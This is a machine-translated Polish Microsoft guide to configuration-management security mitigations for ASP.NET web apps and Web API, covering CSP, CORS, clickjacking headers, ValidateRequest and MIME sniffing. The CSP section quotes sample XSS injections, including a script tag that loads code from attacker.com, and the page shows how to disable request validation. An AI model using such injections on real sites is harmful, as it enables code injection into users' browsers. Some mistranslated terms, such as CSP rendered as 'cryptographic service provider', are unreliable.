---
title: Zarządzanie konfiguracją dla Microsoft Threat Modeling Tool
titleSuffix: Azure
description: Informacje na temat zarządzania konfiguracją Threat Modeling Tool. Zobacz informacje o ograniczeniach i Wyświetl przykłady kodu.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: f28ebb95ae9aaaff3f87d8388a09b41e0b3445b5
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 03/29/2021
ms.locfileid: "94517488"
---
# <a name="security-frame-configuration-management--mitigations"></a>Ramka zabezpieczeń: zarządzanie konfiguracją | Środki zaradcze 
| Produkt/usługa | Artykuł |
| --------------- | ------- |
| **Aplikacja sieci Web** | <ul><li>[Zaimplementuj zasady zabezpieczeń zawartości (CSP) i Wyłącz wbudowane środowisko JavaScript](#csp-js)</li><li>[Włącz filtr XSS przeglądarki](#xss-filter)</li><li>[Aplikacje ASP.NET muszą wyłączyć śledzenie i debugowanie przed wdrożeniem](#trace-deploy)</li><li>[Dostęp do języka JavaScript innych firm tylko z zaufanych źródeł](#js-trusted)</li><li>[Upewnij się, że uwierzytelnione strony ASP.NET obejmują zadośćuczynienie interfejsu użytkownika lub obronę kliknięcia](#ui-defenses)</li><li>[Upewnij się, że tylko zaufane źródła są dozwolone, jeśli funkcja CORS jest włączona w aplikacjach sieci Web ASP.NET](#cors-aspnet)</li><li>[Włącz atrybut ValidateRequest na stronach ASP.NET](#validate-aspnet)</li><li>[Korzystanie z najnowszych wersji bibliotek JavaScript obsługiwanych lokalnie](#local-js)</li><li>[Wyłącz automatyczne wykrywanie MIME](#mime-sniff)</li><li>[Usuń standardowe nagłówki serwera w witrynach sieci Web systemu Windows Azure, aby uniknąć używania odcisków palców](#standard-finger)</li></ul> |
| **Database** (Baza danych) | <ul><li>[Konfigurowanie zapory systemu Windows na potrzeby dostępu do aparatu bazy danych](#firewall-db)</li></ul> |
| **Interfejs API sieci Web** | <ul><li>[Upewnij się, że tylko zaufane źródła są dozwolone, jeśli funkcja CORS jest włączona w interfejsie API sieci Web ASP.NET](#cors-api)</li><li>[Szyfruj sekcje plików konfiguracji internetowego interfejsu API, które zawierają dane poufne](#config-sensitive)</li></ul> |
| **Urządzenie IoT** | <ul><li>[Upewnij się, że wszystkie interfejsy administracyjne są zabezpieczone przy użyciu silnych poświadczeń](#admin-strong)</li><li>[Upewnij się, że nieznany kod nie może zostać wykonany na urządzeniach](#unknown-exe)</li><li>[Szyfrowanie systemu operacyjnego i dodatkowych partycji urządzenia IoT z funkcją blokowania bitowego](#partition-iot)</li><li>[Upewnij się, że na urządzeniach są włączone tylko minimalne usługi/funkcje](#min-enable)</li></ul> |
| **Brama pola IoT** | <ul><li>[Szyfrowanie systemu operacyjnego i dodatkowych partycji bramy pola IoT z usługą Unlocker](#field-bit-locker)</li><li>[Upewnij się, że domyślne poświadczenia logowania bramy pola są zmieniane podczas instalacji](#default-change)</li></ul> |
| **Brama usługi IoT Cloud** | <ul><li>[Upewnij się, że brama chmury implementuje proces, aby zapewnić aktualność oprogramowania układowego podłączonych urządzeń](#cloud-firmware)</li></ul> |
| **Granica zaufania maszyny** | <ul><li>[Upewnij się, że urządzenia mają kontrolki zabezpieczeń punktu końcowego skonfigurowane zgodnie z zasadami organizacji](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zapewnianie bezpiecznego zarządzania kluczami dostępu do usługi Azure Storage](#secure-keys)</li><li>[Upewnij się, że tylko zaufane źródła są dozwolone, jeśli jest włączona funkcja CORS w usłudze Azure Storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Włącz funkcję ograniczania funkcjonalności usług WCF](#throttling)</li><li>[WCF — ujawnienie informacji za poorednictwem metadanych](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Zaimplementuj zasady zabezpieczeń zawartości (CSP) i Wyłącz wbudowane środowisko JavaScript

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Dokumentacja zasad zabezpieczeń zawartości](https://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [czy można używać dostawcy CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroki** | <p>Zasady zabezpieczeń zawartości (CSP) to kompleksowy mechanizm zabezpieczeń, który jest standardem W3C, który umożliwia właścicielom aplikacji sieci Web kontrolę nad zawartością osadzoną w swojej witrynie. Dostawca CSP jest dodawany jako nagłówek odpowiedzi HTTP na serwerze sieci Web i jest wymuszany po stronie klienta przez przeglądarki. Jest to dozwolone zasady oparte na liście — witryna sieci Web może zadeklarować zestaw zaufanych domen, z których można załadować aktywną zawartość, taką jak JavaScript.</p><p>Dostawca CSP zapewnia następujące korzyści w zakresie zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest narażona na ataki XSS, osoba atakująca może wykorzystać ją na dwa sposoby:<ul><li>Wsuń `<script>malicious code</script>` . Korzystanie z tego rozwiązania nie będzie możliwe z powodu ograniczenia podstawowego dostawcy usług kryptograficznych — 1</li><li>Wsuń `<script src="http://attacker.com/maliciousCode.js"/>` . Ta luka w zabezpieczeniach nie będzie działać, ponieważ domena z kontrolą osoby atakującej nie będzie na liście dozwolonych domen dostawcy CSP</li></ul></li><li>**Kontrola nad eksfiltracji danych:** Jeśli jakakolwiek złośliwa zawartość na stronie sieci Web próbuje nawiązać połączenie z zewnętrzną witryną sieci Web i wykraść dane, połączenie zostanie przerwane przez dostawcę usług kryptograficznych. Wynika to z faktu, że domena docelowa nie będzie na liście dozwolonych dostawców CSP</li><li>**Obrona przed kliknięciem —** wykluczanie — wtyczka jest techniką ataków, w której atakującej może korzystać z autentycznej witryny sieci Web i zmusić użytkowników do kliknięcia elementów interfejsu użytkownika. Obecnie należy zapewnić ochronę przed podnośnikami kliknięcia przez skonfigurowanie nagłówka odpowiedzi-X-Frame-Options. Nie wszystkie przeglądarki respektują ten nagłówek i przechodzenie do przodu CSP będzie standardowym sposobem obrony przed kliknięciami</li><li>**Raportowanie ataków w czasie rzeczywistym:** W przypadku ataku z iniekcją w witrynie sieci Web z obsługą CSP przeglądarki automatycznie wyzwalają powiadomienie w punkcie końcowym skonfigurowanym na serwerze WebServer. W ten sposób dostawca usług kryptograficznych służy jako system ostrzegający w czasie rzeczywistym.</li></ul> |

### <a name="example"></a>Przykład
Przykładowe zasady: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Te zasady umożliwiają ładowanie skryptów tylko z serwera aplikacji sieci Web i serwera usługi Google Analytics. Skrypty ładowane z dowolnej innej lokacji zostaną odrzucone. Gdy dostawca usług kryptograficznych jest włączony w witrynie sieci Web, następujące funkcje są automatycznie wyłączane w celu ograniczenia ataków typu XSS. 

### <a name="example"></a>Przykład
Skrypty wbudowane nie zostaną wykonane. Poniżej przedstawiono przykłady skryptów wbudowanych 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Przykład
Ciągi nie będą oceniane jako kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Włącz filtr XSS przeglądarki

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Filtr ochrony XSS](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Kroki** | <p>Konfiguracja nagłówka odpowiedzi X-XSS-Protection kontroluje filtr skryptu między lokacjami w przeglądarce. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:` Spowoduje to wyłączenie filtru</li><li>`1: Filter enabled` W przypadku wykrycia ataku z obsługą skryptów między lokacjami w celu zatrzymania ataku przeglądarka będzie oczyszczać stronę</li><li>`1: mode=block : Filter enabled`. Zamiast oczyszczania strony, gdy zostanie wykryty atak typu XSS, przeglądarka uniemożliwi renderowanie strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Przeglądarka spowoduje wyoczyszczanie strony i zgłoszenie naruszenia.</li></ul><p>Jest to funkcja chromu wykorzystująca raporty naruszeń dostawcy usług kryptograficznych do wysyłania szczegółowych informacji do wybranego identyfikatora URI. Ostatnie 2 opcje są uznawane za bezpieczne wartości.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>Aplikacje ASP.NET muszą wyłączyć śledzenie i debugowanie przed wdrożeniem

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Omówienie debugowania ASP.NET](/previous-versions/ms227556(v=vs.140)), [śledzenie ASP.NET](/previous-versions/bb386420(v=vs.140)), [instrukcje: Włączanie śledzenia dla aplikacji ASP.NET](/previous-versions/0x5wc973(v=vs.140)), [instrukcje: Włączanie debugowania dla aplikacji ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroki** | Gdy śledzenie jest włączone dla strony, każda przeglądarka żąda jej również uzyskuje informacje o śledzeniu zawierające dane dotyczące stanu i przepływu pracy wewnętrznego serwera. Te informacje mogą być wrażliwe na zabezpieczenia. Po włączeniu debugowania na stronie błędy występujące na serwerze powodują wyświetlenie pełnych danych śledzenia stosu do przeglądarki. Dane te mogą ujawniać informacje poufne dla bezpieczeństwa serwera. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Dostęp do języka JavaScript innych firm tylko z zaufanych źródeł

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | do kodu JavaScript innych firm należy odwoływać się tylko z zaufanych źródeł. Punkty końcowe odwołania powinny zawsze mieć wartość TLS. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Upewnij się, że uwierzytelnione strony ASP.NET obejmują zadośćuczynienie interfejsu użytkownika lub obronę kliknięcia

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [OWASP kliknij pozycję Ochrona Ściągawka arkusza](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), wewnętrzne elementy [programu IE — walka z obsługą opcji X-Frame-Range](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Kroki** | <p>w przypadku, gdy osoba atakująca używa wielu przezroczystych lub nieprzezroczystych warstw w celu nakłonienia użytkownika do kliknięcia przycisku lub linku na innej stronie, gdy zachodzi taka potrzeba, kliknij stronę najwyższego poziomu.</p><p>Ta warstwa jest osiągana przez Napływanie złośliwej strony z elementem iframe, który ładuje stronę ofiary. W takim przypadku osoba atakująca to "przejmowanie", które są przeznaczone dla swojej strony i rozsyłają je do innej strony, najprawdopodobniej są własnością innej aplikacji, domeny lub obu. Aby zapobiec atakom typu dwukrotnego, ustaw odpowiednie nagłówki odpowiedzi HTTP z opcjami X-Frame-Option, które instruują przeglądarkę, aby nie zezwalać na ramkę z innych domen</p>|

### <a name="example"></a>Przykład
Nagłówek X-FRAME-OPTIONS można ustawić za pośrednictwem usług IIS web.config. Web.config fragment kodu dotyczący witryn, które nigdy nie powinny być frameowe: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Przykład
Web.config kod dla witryn, które powinny być poddzielone tylko przez strony w tej samej domenie: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Upewnij się, że tylko zaufane źródła są dozwolone, jeśli funkcja CORS jest włączona w aplikacjach sieci Web ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Formularze sieci Web, MVC5 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywane zasadami tego samego źródła i uniemożliwia złośliwym lokacjom odczytywanie poufnych danych z innej lokacji. Czasami jednak może być konieczne, aby udostępnić interfejsy API bezpiecznie, które mogą zużywać inne lokacje. Udostępnianie zasobów między źródłami (CORS) jest standardem W3C, który umożliwia serwerowi złagodzenie zasad tego samego źródła. Przy użyciu mechanizmu CORS serwer może jawnie zezwolić na niektóre żądania między źródłami podczas odrzucania innych.</p><p>Mechanizm CORS jest bezpieczniejszy i bardziej elastyczny niż wcześniejsze techniki, takie jak JSONP. Na swoim rdzeńu włączenie funkcji CORS tłumaczy, aby dodać do aplikacji sieci Web kilka nagłówków odpowiedzi HTTP (Access-Control-*) i można to zrobić na kilka sposobów.</p>|

### <a name="example"></a>Przykład
Jeśli dostęp do Web.config jest dostępny, CORS można dodać za pomocą następującego kodu: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Przykład
Jeśli dostęp do web.config nie jest dostępny, można skonfigurować funkcję CORS, dodając następujący kod CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Należy pamiętać, że ma to na celu zapewnienie, że lista źródeł w atrybucie "Access-Control-Allow-Origin" jest ustawiona na skończoną i zaufany zestaw źródeł. Niewłaściwe skonfigurowanie tego ustawienia (np. ustawienie wartości "*") umożliwi złośliwym lokacjom wyzwalanie żądań krzyżowych dla aplikacji sieci Web >bez żadnych ograniczeń, co sprawia, że aplikacja narażona na ataki CSRF. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Włącz atrybut ValidateRequest na stronach ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Formularze sieci Web, MVC5 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Żądanie walidacji — zapobieganie atakom za pomocą skryptów](https://www.asp.net/whitepapers/request-validation) |
| **Kroki** | <p>Zażądaj zweryfikowania funkcji ASP.NET od wersji 1,1, uniemożliwiając serwerowi akceptowanie zawartości zawierającej niezakodowany kod HTML. Ta funkcja została zaprojektowana w taki sposób, aby zapobiec atakom polegającym na wstrzyknięciu skryptów, zgodnie z którymi kod skryptu klienta lub HTML może być nieświadomie przesłany do serwera, przechowywany i przedstawiony innym użytkownikom. Zdecydowanie zalecamy, aby sprawdzać poprawność wszystkich danych wejściowych i kodu HTML w razie potrzeby.</p><p>Sprawdzanie poprawności żądania jest wykonywane przez porównanie wszystkich danych wejściowych z listą potencjalnie niebezpiecznych wartości. W przypadku wystąpienia dopasowania ASP.NET wywołuje `HttpRequestValidationException` . Domyślnie funkcja walidacji żądania jest włączona.</p>|

### <a name="example"></a>Przykład
Tę funkcję można jednak wyłączyć na poziomie strony: 
```XML
<%@ Page validateRequest="false" %> 
```
lub na poziomie aplikacji 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Należy pamiętać, że funkcja walidacji żądania nie jest obsługiwana i nie jest częścią potoku MVC6. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Korzystanie z najnowszych wersji bibliotek JavaScript obsługiwanych lokalnie

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Nie dotyczy  |
| **Kroki** | <p>Deweloperzy korzystający ze standardowych bibliotek języka JavaScript, takich jak JQuery, muszą używać zatwierdzonych wersji wspólnych bibliotek języka JavaScript, które nie zawierają znanych wad zabezpieczeń. Dobrym sposobem jest użycie najnowszej wersji bibliotek, ponieważ zawierają one poprawki zabezpieczeń znanych luk w zabezpieczeniach w ich starszych wersjach.</p><p>Jeśli nie można użyć najnowszej wersji ze względu na zgodność, należy użyć poniższych minimalnych wersji.</p><p>Akceptowalne wersje minimalne:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Weryfikuj 1,9</li><li>JQuery Mobile 1.0.1</li><li>JQuery cykl 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Zestaw narzędzi AJAX Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms i AJAX**<ul><li>ASP.NET Web Forms i AJAX 4</li><li>ASP.NET AJAX 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Nigdy nie Ładuj żadnej biblioteki JavaScript z witryn zewnętrznych, takich jak Public sieci CDN</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Wyłącz automatyczne wykrywanie MIME

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | Program [IE8 Security część V: Kompleksowa ochrona](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [Typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Kroki** | Nagłówek X-Content-options jest nagłówkiem HTTP, który umożliwia deweloperom określenie, że ich zawartość nie powinna być wykrywaniem MIME. Ten nagłówek jest przeznaczony do ograniczania ataków MIME-Sniffing. Dla każdej strony, która może zawierać zawartość z możliwością kontrolowania użytkownika, należy użyć nagłówka HTTP X-Content-Type-Options: nowykrywania. Aby włączyć wymagany nagłówek globalnie dla wszystkich stron w aplikacji, można wykonać jedną z następujących czynności:|

### <a name="example"></a>Przykład
Dodaj nagłówek w pliku web.config, jeśli aplikacja jest hostowana przez Internet Information Services (IIS) w wersji 7 lub nowszej. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Przykład
Dodawanie nagłówka za pomocą globalnej aplikacji \_ BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Przykład
Implementowanie niestandardowego modułu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Przykład
Wymagany nagłówek można włączyć tylko dla określonych stron, dodając go do poszczególnych odpowiedzi: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Usuń standardowe nagłówki serwera w witrynach sieci Web systemu Windows Azure, aby uniknąć używania odcisków palców

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja internetowa | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | Ogólny |
| **Atrybuty**              | EnvironmentType — Azure |
| **Odwołania**              | [Usuwanie standardowych nagłówków serwera w witrynach sieci Web systemu Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroki** | Nagłówki, takie jak Server, X-in, X-AspNet-Version, ujawniają informacje o serwerze i podstawowych technologiach. Zalecane jest, aby pominąć te nagłówki, zapobiegając tym samym odciskiem palca aplikacji |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Konfigurowanie zapory systemu Windows na potrzeby dostępu do aparatu bazy danych

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | baza danych | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | SQL Azure, lokalnego |
| **Atrybuty**              | Nie dotyczy, wersja SQL — V12 |
| **Odwołania**              | [Jak skonfigurować zaporę Azure SQL Database](../../azure-sql/database/firewall-configure.md), [Skonfiguruj zaporę systemu Windows na potrzeby dostępu do aparatu bazy danych](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Kroki** | Systemy zapory zapobiegają nieautoryzowanemu dostępowi do zasobów komputera. Aby uzyskać dostęp do wystąpienia aparatu bazy danych SQL Server za pomocą zapory, należy skonfigurować zaporę na komputerze z systemem SQL Server, aby zezwolić na dostęp |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Upewnij się, że tylko zaufane źródła są dozwolone, jeśli funkcja CORS jest włączona w interfejsie API sieci Web ASP.NET

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | MVC 5 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Włączanie żądań cross-Origin w ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API-CORS support w ASP.NET Web API 2](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywane zasadami tego samego źródła i uniemożliwia złośliwym lokacjom odczytywanie poufnych danych z innej lokacji. Czasami jednak może być konieczne, aby udostępnić interfejsy API bezpiecznie, które mogą zużywać inne lokacje. Udostępnianie zasobów między źródłami (CORS) jest standardem W3C, który umożliwia serwerowi złagodzenie zasad tego samego źródła.</p><p>Przy użyciu mechanizmu CORS serwer może jawnie zezwolić na niektóre żądania między źródłami podczas odrzucania innych. Mechanizm CORS jest bezpieczniejszy i bardziej elastyczny niż wcześniejsze techniki, takie jak JSONP.</p>|

### <a name="example"></a>Przykład
W App_Start/WebApiConfig.cs Dodaj następujący kod do metody WebApiConfig. Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Przykład
Atrybut EnableCors można zastosować do metod akcji w kontrolerze w następujący sposób: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Należy pamiętać, że ma to na celu zapewnienie, że lista źródeł w atrybucie EnableCors jest ustawiona na skończoną i zaufany zestaw źródeł. Niewłaściwe skonfigurowanie tego ustawienia (np. ustawienie wartości "*") umożliwi złośliwym lokacjom wyzwalanie żądań między źródłami w interfejsie API bez żadnych ograniczeń, >sprawia to, że interfejs API narażony na ataki CSRF. EnableCors mogą być dekoracyjne na poziomie kontrolera. 

### <a name="example"></a>Przykład
Aby wyłączyć funkcję CORS dla konkretnej metody w klasie, można użyć atrybutu DisableCors, jak pokazano poniżej: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Tytuł                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Odpowiednie technologie** | MVC 6 |
| **Atrybuty**              | Nie dotyczy  |
| **Odwołania**              | [Włączanie żądań między źródłami (CORS) w ASP.NET Core 1,0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroki** | <p>W ASP.NET Core 1,0 można włączyć funkcję CORS przy użyciu oprogramowania pośredniczącego lub składnika MVC. W przypadku włączenia mechanizmu CORS przy użyciu MVC są używane te same usługi CORS, ale oprogramowanie do obsługi mechanizmu CORS nie jest.</p>|

**Podejście-1** Włączanie mechanizmu CORS przy użyciu oprogramowania pośredniczącego: Aby włączyć mechanizm CORS dla całej aplikacji, Dodaj oprogramowanie pośredniczące CORS do potoku żądania przy użyciu metody rozszerzenia UseCors. Zasady obejmujące wiele źródeł można określić podczas dodawania oprogramowania pośredniczącego CORS przy użyciu klasy CorsPolicyBuilder. Istnieją dwa sposoby wykonania tej czynności:

### <a name="example"></a>Przykład
Pierwszym jest wywołanie UseCors z wyrażeniem lambda. Wyrażenie lambda przyjmuje obiekt CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Przykład
Drugim jest zdefiniowanie jednej lub więcej nazwanych zasad CORS, a następnie wybranie zasad według nazwy w czasie wykonywania. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Podejście-2** Włączanie mechanizmu CORS w MVC: deweloperzy mogą alternatywnie użyć MVC do zastosowania określonego mechanizmu CORS na akcję, na kontroler lub globalnie dla wszystkich kontrolerów.

### <a name="example"></a>Przykład
Na akcję: aby określić zasady CORS dla określonej akcji, Dodaj atrybut [EnableCors] do akcji. Określ nazwę zasad. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Przykład
Na kontroler: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Przykład
Globalnie 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
